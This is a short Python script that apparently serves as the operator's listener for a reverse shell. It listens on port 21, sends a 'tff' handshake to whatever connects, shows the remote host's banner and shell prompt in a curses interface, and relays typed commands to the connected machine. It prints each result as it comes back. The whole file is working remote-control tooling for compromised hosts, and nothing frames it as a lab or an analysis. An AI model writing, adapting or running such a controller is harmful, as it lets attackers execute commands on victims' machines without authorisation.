import socket
import time
import curses
import readline
def load_history():
    try:
        readline.read_history_file('history.txt')
    except FileNotFoundError:
        pass
def save_history():
    readline.write_history_file('history.txt')

def create_server(scr):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(('0.0.0.0', 21))
    s.listen(1)
    scr.addstr(0,0,"WAITING...")
    scr.refresh()
    return s

def accept_connection(s,scr):
    tar, addr = s.accept()
    handshake(tar)
    res = tar.recv(1024)
    shell = tar.recv(1024)
    scr.addstr(1,0,f'''
 ┌───────────────────────────────────────────┐
 │      3333333                   3          │
 │   333      3333               33          │
 │  33           33             333          │
 │  3             3           33333          │
 │  33            3          33  33          │
 │   333         33        333   33          │
 │               3        33     33          │
 │              3                33          │
 │             33                33          │
 │          3333     33          33          │
 │      3333333333333            33          │
 │    3333                 33333333333333333 │
 │                        33                 │
 └───────────────────────────────────────────┘
Connect  {addr}{res.decode()}''')
    return tar,shell.decode()
def handshake(tar):
    tar.send(b'tff')

def handle_client(tar,shell,scr):
    cmd = ''
    line = 21
    while cmd != '/21':
        scr.refresh()
        scr.addstr(line,0,f'{shell}> {cmd}')
        key = scr.getch()
        if key == 10 and cmd!='':
            tar.send(cmd.encode())
            res = tar.recv(1024).decode()
            if res:
                scr.addstr(line+1,0,f"{res}")
            else:
                scr.addstr(line+1,0,"No response received or connection lost.")
            cmd = ''
            line += len(res.splitlines()) + 2
            time.sleep(0.3)
        elif key == curses.KEY_BACKSPACE or key == 127:
            cmd = cmd[:-1]
            scr.clrtoeol()
            scr.refresh()
        elif key >= 32 and key <= 126:
            cmd += chr(key)


def close_server(s, tar):
    tar.close()
    s.close()

def main(scr):
    h,w = scr.getmaxyx()
    win = curses.newwin(h,w,0,0)
    win.scrollok(True)
    s = create_server(win)
    tar,shell = accept_connection(s,win)
    try:
        handle_client(tar,shell,win)

    except KeyboardInterrupt:
        scr.addstr(21,21,'\n[exited]')
    finally:
        close_server(s, tar)

curses.wrapper(main)
